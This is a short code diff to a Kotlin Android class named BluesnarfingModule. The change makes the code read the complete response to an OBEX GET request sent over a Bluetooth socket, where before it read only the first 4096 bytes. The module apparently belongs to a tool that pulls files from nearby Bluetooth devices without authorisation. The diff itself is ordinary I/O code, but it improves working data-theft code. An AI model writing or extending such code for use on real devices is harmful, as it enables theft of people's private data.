@@ -2,6 +2,7 @@ package com.hereliesaz.blusnu.data
 
 import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothSocket
+import java.io.ByteArrayOutputStream
 import java.io.IOException
 import java.util.UUID
 
@@ -39,9 +40,18 @@ class BluesnarfingModule {
             ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)
             outputStream.write(getRequest)
 
-            // Read the response
-            val getResponse = ByteArray(4096)
-            val getResponseLength = inputStream.read(getResponse)
+            // Read the response in a loop
+            val baos = ByteArrayOutputStream()
+            val buffer = ByteArray(4096)
+            var bytesRead: Int
+            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
+                baos.write(buffer, 0, bytesRead)
+                if (inputStream.available() <= 0) {
+                    break
+                }
+            }
+            val getResponse = baos.toByteArray()
+
 
             return if (getResponse[0] == 0xA0.toByte()) {
                 // Success, parse the response
